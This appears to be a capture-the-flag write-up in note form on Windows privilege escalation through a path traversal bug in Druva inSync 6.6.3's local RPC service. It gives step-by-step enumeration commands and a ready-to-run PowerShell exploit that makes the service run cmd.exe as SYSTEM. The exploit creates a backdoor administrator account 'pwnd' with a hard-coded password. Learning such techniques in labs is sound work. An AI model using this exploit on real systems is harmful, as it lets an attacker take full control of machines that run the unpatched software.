
---
#### **1. List Installed Software**

Open **Command Prompt** or **PowerShell** on the target machine and run:

```cmd
wmic product get name,version,vendor
```

This will show you something like:

```
Name                        Version       Vendor
------------------------------------------------------
Druva inSync                6.6.3         Druva Inc.
Google Chrome               89.0.4389.90  Google Inc.
7-Zip                       18.01         Igor Pavlov
```

#### **2. Identify Potentially Vulnerable Software**

Look for:

- Outdated versions
    
- Lesser-known or enterprise apps (like **Druva inSync**)
    
- Apps installed a long time ago and not frequently updated
    

#### **3. Search for Known Vulnerabilities**

Use Google or exploit databases like:

- 🔗 [https://www.exploit-db.com](https://www.exploit-db.com/)
    
- 🔗 [https://packetstormsecurity.com](https://packetstormsecurity.com/)
    

Search using queries like:

```
Druva inSync 6.6.3 privilege escalation site:exploit-db.com
```

or simply:

```
<Software Name> <Version> privilege escalation exploit
```

---

### 🛠️ What’s Happening?

1. The target system has **unpatched software** — **Druva inSync version 6.6.3**.
    
2. This software runs a **local RPC server on port 6064** as the SYSTEM user.
    
3. That RPC server allows **anyone on the system** to run commands as SYSTEM, due to a **path traversal bug**.
    
4. This bug can be exploited using **PowerShell** to gain **administrator privileges**.
    

---

### 💥 Why Is It Vulnerable?

- The software only allows running programs from:
    
    ```
    C:\ProgramData\Druva\inSync4\
    ```
    
- But you can bypass this by using:
    
    ```
    C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
    ```
    
- This trick **jumps up the folder tree** and runs `cmd.exe` as SYSTEM.
    

---

### 🧑‍💻 The Exploit

Here's how the exploit works, step-by-step:

1. Connect to the vulnerable Druva RPC service on port **6064**.
    
2. Send a **special packet** to tell it to execute a command (procedure 5).
    
3. Send the path to `cmd.exe` using path traversal.
    
4. Run a command to **create a new admin user** called `pwnd`.
    
![[Pasted image 20250429154607.png]]

---

### ✅ Working Exploit Code (PowerShell)

Use this code in a PowerShell window on the target machine:

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd")
$length = [System.BitConverter]::GetBytes($command.Length)

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

---

### 🔓 What Happens?

- Run a command prompt as administrator
- A new user `pwnd` with password `SimplePass123` is created.
    
- The user is added to the **Administrators group**.
    
- You can now log in as `pwnd` and get full admin access.
    

---

### 🏁 Final Step – Get the Flag

1. Run a command prompt **as pwnd**.
    
2. Open this file:
    
    ```
    C:\Users\Administrator\Desktop\flag.txt
    ```
    
3. Use:
    
    ```cmd
    type C:\Users\Administrator\Desktop\flag.txt
    ```
    

And you’ve successfully **escalated privileges** using a **vulnerable application**!

---
